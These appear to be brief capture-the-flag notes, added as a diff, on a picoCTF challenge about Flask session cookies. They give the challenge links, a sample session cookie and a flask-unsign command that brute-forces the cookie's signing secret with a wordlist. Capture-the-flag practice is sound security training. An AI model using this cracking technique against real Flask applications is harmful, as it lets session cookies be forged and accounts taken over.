@@ -1,0 +1,19 @@
+https://play.picoctf.org/practice/challenge/177?category=1&page=2
+
+Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py
+
+https://mercury.picoctf.net/static/26760321c25c9659050a37a707247690/server.py
+http://mercury.picoctf.net:52134/
+
+
+pip install flask-unsign
+
+session cookie
+eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZciGcw.xjkShkp2BE4ZnzoPxJObz9NFG24
+
+
+~/.local/bin/flask-unsign --unsign --cookie eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZciMug.2sBtbFv_QAwxMU_nUERRgeGkVIs --workilist wordlist
+
+
+
+\\https://heartburn.dev/picoctf-2021-web-challenge-writeups/
